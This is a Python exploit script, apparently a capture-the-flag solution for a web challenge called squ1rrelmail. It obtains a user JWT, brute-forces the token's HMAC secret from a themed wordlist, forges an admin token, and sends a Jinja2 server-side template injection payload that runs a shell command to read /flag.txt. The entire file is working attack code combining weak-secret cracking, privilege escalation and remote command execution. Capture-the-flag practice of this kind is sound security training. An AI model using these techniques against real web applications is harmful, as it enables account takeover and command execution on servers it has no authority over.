#!/usr/bin/env python3
import base64
import hashlib
import hmac
import itertools
import json
import re
import sys
import time

import requests

BASE = "http://squ1rrelmail.squ1rrel.dev"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def get_login_token(username: str = "test") -> str:
    r = requests.post(
        f"{BASE}/login",
        data={"username": username},
        headers={"User-Agent": UA},
        allow_redirects=False,
        timeout=20,
    )
    r.raise_for_status()
    set_cookie = r.headers.get("Set-Cookie", "")
    m = re.search(r"token=([^;]+)", set_cookie)
    if not m:
        raise RuntimeError("Gagal ambil token dari Set-Cookie")
    return m.group(1)


def crack_jwt_secret(token: str) -> str:
    header, payload, signature = token.split(".")
    signing_input = f"{header}.{payload}".encode()

    words = [
        "secret", "squirrel", "squ1rrel", "squ1rrelmail", "acorn", "tree", "forest", "woodland",
        "admin", "moderator", "burrow", "nut", "oak", "pine", "walnut", "uncrackable", "jwt",
        "jwtsecret", "supersecret", "password", "changeme", "letmein", "qwerty", "123456",
        "university", "arborist", "case1337", "2026", "squ1rrel.dev", "squ1rrelmail.squ1rrel.dev",
    ]

    candidates = []
    for w in words:
        candidates.extend([w, w + "123", w + "2026", w + "1337", w + "!", w + "@123", w.title(), w.upper()])

    for a, b in itertools.product(["squ1rrel", "squirrel", "acorn", "forest", "tree", "oak", "nut", "mail"], repeat=2):
        candidates.extend([a + b, a + "_" + b, a + "-" + b])

    for key in dict.fromkeys(words + candidates):
        digest = hmac.new(key.encode(), signing_input, hashlib.sha256).digest()
        if b64url_encode(digest) == signature:
            return key

    raise RuntimeError("Secret JWT tidak ditemukan")


def forge_admin_token(secret: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"username": "admin", "role": "admin", "exp": int(time.time()) + 3600}
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    sig = b64url_encode(hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"


def exploit_ssti_for_flag(admin_token: str) -> str:
    payload = "{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}"
    r = requests.get(
        f"{BASE}/acorn-inbox",
        params={"acorn": payload},
        headers={"Cookie": f"token={admin_token}", "User-Agent": UA},
        timeout=20,
    )
    r.raise_for_status()
    m = re.search(r"(squ1rrel\{[^}]+\})", r.text)
    if not m:
        raise RuntimeError("Flag tidak ditemukan")
    return m.group(1)


def main() -> int:
    try:
        token = get_login_token("test")
        secret = crack_jwt_secret(token)
        admin_token = forge_admin_token(secret)
        flag = exploit_ssti_for_flag(admin_token)
        print(flag)
        return 0
    except Exception as e:
        print(f"[!] Error: {e}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
